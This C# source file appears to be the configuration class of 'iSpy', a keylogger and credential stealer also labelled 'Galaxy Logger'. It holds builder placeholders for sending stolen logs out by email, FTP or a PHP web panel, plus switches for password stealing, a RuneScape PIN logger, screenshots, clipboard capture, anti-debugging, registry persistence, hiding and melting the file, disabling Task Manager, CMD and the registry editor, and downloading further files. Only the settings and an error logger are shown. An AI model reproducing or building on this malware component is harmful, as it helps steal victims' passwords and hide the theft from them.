using System;
using System.Diagnostics;
namespace iSpy
{
    public class Config
    {


        public static string VERSION = "3.6";

        public static string HWID = "[HWID]";
        public static string GUID;

        public static string MUTEX = "[MUTEX]";
        public static string UPLOAD_METHOD = "[UPLOADMETHOD]";


        public static string EMAIL_USERNAME = "[EMAILUSERNAME]";
        public static string EMAIL_PASSWORD = "[EMAILPASSWORD]";
        public static string EMAIL_PORT = "[EMAILPORT]";
        public static string EMAIL_SERVER = "[EMAILSERVER]";
        public static string EMAIL_SSL = "[EMAILSSL]";

        public static string FTP_USERNAME = "[FTPUSERNAME]";
        public static string FTP_PASSWORD = "[FTPPASSWORD]";
        public static string FTP_SERVER = "[FTPSERVER]";

        public static string PHP_KEY = "[WEBPANELKEY]";
        public static string WEBPANEL = "[WEBPANEL]";

        public static string LOG_INTERVAL = "[LOGINTERVAL]"; //Minutes


        public static string CLIPBOARD_MONITORING = "[CLIPBOARD]";

        public static string MODIFY_TASK_MANAGER = "[MODIFYTASK]";
        public static string ANTI_DEBUGGERS = "[ANTIEMULATION]";
        public static string PROCESS_PROTECTION = "[PROCESSPROTECTION]";
        public static string RUNESCAPE_PINLOGGER = "[PINLOGGER]";
        public static string CLEAR_SAVED = "[CLEARSAVED]";
        public static string PASSWORD_STEALER = "[STEALER]";
       

        public static string MELT_FILE = "[MELTFILE]";
        public static string SEND_SCREENSHOTS = "[SCREENSHOTS]";


        public static string INSTALL_FILE = "[INSTALLFILE]";
        public static string PATH_TYPE = "[PATHTYPE]";
        public static string FOLDER_NAME = "[FOLDER]";
        public static string FILE_NAME = "[FILENAME]";

        public static string HKCU = "[HKCU]";
        public static string HKLM = "[HKLM]";

        public static string REGISTRY_PERSISTENCE = "[REGPERSISTENCE]";
        public static string HIDE_FILE = "[HIDEFILE]";

        public static string DOWNLOAD_FILE = "[DOWNLOADURL]";
        public static string DOWNLOAD_FILE_TYPE = "[TYPE]";

        public static string MESSAGE_TYPE = "[MTYPE]";
        public static string MESSAGE_TITLE = "[MTITLE]";
        public static string MESSAGE_BODY = "[MBODY]";

        public static string DELAY_EXECUTION = "[DELAY]"; //Seconds

        public static string ANTI_TASKMGR = "[TASKMGR]";
        public static string ANTI_CMD = "[CMD]";
        public static string ANTI_REGISTRY = "[REGISTRY]";
        public static string BOT_KILL = "[BOTKILL]";
        public static string VISIT_WEBSITE = "[URL]";

/*
        public static string MUTEX = "dsfsdfsdf";
        public static string UPLOAD_METHOD = "PHP";


        public static string EMAIL_USERNAME = "";
        public static string EMAIL_PASSWORD = "";
        public static string EMAIL_PORT = "";
        public static string EMAIL_SERVER = "";
        public static string EMAIL_SSL = "";

        public static string FTP_USERNAME = "";
        public static string FTP_PASSWORD = "";
        public static string FTP_SERVER = "";

        public static string PHP_KEY = "";
        public static string WEBPANEL = "";

        public static string LOG_INTERVAL = "30"; //Minutes


        public static string CLIPBOARD_MONITORING = "";

        public static string MODIFY_TASK_MANAGER = "";
        public static string ANTI_DEBUGGERS = "";
        public static string PROCESS_PROTECTION = "";
        public static string RUNESCAPE_PINLOGGER = "[PINLOGGER]";
        public static string CLEAR_SAVED = "";
        public static string PASSWORD_STEALER = "";


        public static string MELT_FILE = "";
        public static string SEND_SCREENSHOTS = "";


        public static string INSTALL_FILE = "";
        public static string PATH_TYPE = "";
        public static string FOLDER_NAME = "";
        public static string FILE_NAME = "";

        public static string HKCU = "";
        public static string HKLM = "";
        public static string REGISTRY_PERSISTENCE = "";
        public static string HIDE_FILE = "";

        public static string DOWNLOAD_FILE = "";
        public static string DOWNLOAD_FILE_TYPE = "";

        public static string MESSAGE_TYPE = "";
        public static string MESSAGE_TITLE = "";
        public static string MESSAGE_BODY = "";

        public static string DELAY_EXECUTION = "0"; //Seconds
 
        public static string ANTI_TASKMGR = "[TASKMGR]";
        public static string ANTI_CMD = "[CMD]";
        public static string ANTI_REGISTRY = "[REGISTRY]";
*/



        public static void DumpErrorLog(Exception ex, string data)
        {
            StackTrace trace = new StackTrace(ex, true);
            string ErrorLog = "[Galaxy Logger - Error] " + "Function: " + trace.GetFrame(0).GetMethod().Name + "\r\n" +
                              "Line: " + trace.GetFrame(0).GetFileLineNumber() + "\r\n" +
                              "Column: " + trace.GetFrame(0).GetFileColumnNumber() + "\r\n" +
                              "Message: " + ex.Message + "\r\n" +
                              "Stacktrace: " + ex.StackTrace;
            System.IO.File.WriteAllText(System.IO.Path.GetTempFileName(), data + Environment.NewLine + ErrorLog);
            Debug.WriteLine(ErrorLog);
            Console.WriteLine(ErrorLog);
        }

    }
}
